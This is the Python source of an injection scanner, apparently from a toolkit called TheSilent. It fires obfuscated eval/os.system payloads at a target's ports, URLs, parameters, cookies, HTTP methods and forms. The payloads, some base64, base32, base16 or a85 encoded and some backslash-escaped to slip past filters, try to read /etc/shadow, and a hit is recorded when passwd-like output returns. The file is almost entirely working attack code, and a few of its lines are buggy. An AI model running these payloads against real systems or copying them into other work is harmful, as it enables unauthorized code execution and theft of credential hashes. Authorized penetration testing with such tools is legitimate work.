# a python injection scanner by Invizabel

import io
import re
import time
import urllib.parse
import socket
from urllib.parse import *
import TheSilent.dolphin as dolphin
import TheSilent.puppy_requests as puppy_requests
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

init_mal_python = [r"eval(compile('import os\nos.system(\'cat /etc/shadow\')', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.b64decode(b\'Y2F0IC9ldGMvc2hhZG93\').decode())', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.b32decode(b\'MNQXIIBPMV2GGL3TNBQWI33X\').decode())', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.b16decode(b\'636174202F6574632F736861646F77\').decode())', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\nos.system(base64.a85decode(b\'@psI%04f6806:f8A8cY\').decode())', 'melon', 'exec'))",
                   r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b64decode(b\'L2V0Yy9zaGFkb3c=\'),\'r\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b32decode(b\'F5SXIYZPONUGCZDPO4======\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b16decode(b\'2F6574632F736861646F77\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))"
                   r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.a85decode(b\'@psI%04f6806:f8A8cY\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))"]

mal_python = init_mal_python[:]
for mal in mal_python:
    evade = ""
    for char in mal:
        evade += "\\" + char
    init_mal_python.append(evade)
for mal in init_mal_python:
    mal_python.append(io.BytesIO(mal.encode()))
    mal_python.append(io.BytesIO(mal.encode() + b" #.apk"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.bat"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.csv"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.gif"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.jpeg"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.jpg"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.log"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.m4a"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.mkv"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.mp3"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.mp4"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.pdf"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.png"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.ps1"))
    mal_python.append(io.BytesIO(mal.encode() + b" #.sh"))

form_headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding":"deflate",
                "Accept-Language":"en-US,en;q=0.5",
                "Content-Type":"application/x-www-form-urlencoded",
                "User-Agent":return_user_agent(),
                "UPGRADE-INSECURE-REQUESTS":"1"}

def melon(host,delay=0):
    print(CYAN + "")
    clear()
    hits = []

    ports = []
    banners = dolphin.dolphin(urllib.parse.urlparse(host).netloc,True)
    for banner in banners:
        ports.append(re.findall(":(\d+)-",banner)[0])

    print(CYAN + f"scanning ports for vulnerabilities on {urllib.parse.urlparse(host).netloc}")
    for port in ports:
        try:
            for mal in mal_python:
                time.sleep(delay)
                my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                my_socket.settimeout(10)
                my_socket.connect((urllib.parse.urlparse(host).netloc,int(port)))
                my_socket.send(mal)
                my_socket.send(mal.encode())
                data = my_socket.recv(65536)
                my_socket.close()
                if len(data) > 0:
                    hits.append(f"{urllib.parse.urlparse(host).netloc}:{port}/tcp- {data} ({mal})")

        except:
            pass

        try:
            for mal in mal_python:
                time.sleep(delay)
                my_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                my_socket.settimeout(10)
                my_socket.sendto(mal,(urllib.parse.urlparse(host).netloc,int(port)))
                my_socket.sendto(mal.encode(),(urllib.parse.urlparse(host).netloc,int(port)))
                data = my_socket.recvfrom(65536)
                my_socket.close()
                if len(data) > 0:
                    hits.append(f"{urllib.parse.urlparse(host).netloc}:{port}/udp- {data} ({mal})")

        except:
            pass

    print(CYAN + f"scanning for vulnerabilities on {host}")

    try:
        original_page = puppy_requests.text(host)
        all_forms = re.findall("<form[\S\s\n]+/form>", original_page)

    except:
        pass

    print(CYAN + "checking for python injection")
    for mal in mal_python:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in url ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host, params={mal:mal})
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in header ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host, params={"Cookie":mal})
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in cookie ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host, method=mal.upper())
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in method ({host}): {mal}")

        except:
            pass

        try:
            if len(all_forms) > 0:
                for form in all_forms:
                    time.sleep(delay)
                    action_bool = True
                    form_names = []
                    mal_value = []
                    form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                    form_input = re.findall("<input.+>", form)
                    for field in form_input:
                        form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                        form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']", field)[0]
                        form_names.append(form_name)
                        if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                            mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']", field)[0])

                        else:
                            mal_value.append(mal)

                    try:
                        action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']", form)[0]
                        if action_tag.startswith("https://") or action_tag.startswith("http://"):
                            action = action_tag

                        if action_tag.startswith("/"):
                            action = host + action_tag

                        else:
                            action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                    except IndexError:
                        action_bool = False

                    if action_bool:
                        data = puppy_requests.text(action,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers)
                        if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                            hits.append(f"python injection in forms ({action}): {dict(zip(form_names,mal_value))}")

                    else:
                        data = puppy_requests.text(host,method=form_method.upper(),params=dict(zip(form_names,mal_value)),headers=form_headers)
                        if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                            hits.append(f"python injection in forms ({host})- {dict(zip(form_names,mal_value))}")

        except:
            pass

    hits = list(set(hits[:]))
    hits.sort()
    clear()
    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)

    else:
        print(GREEN + "we didn't find anything interesting")
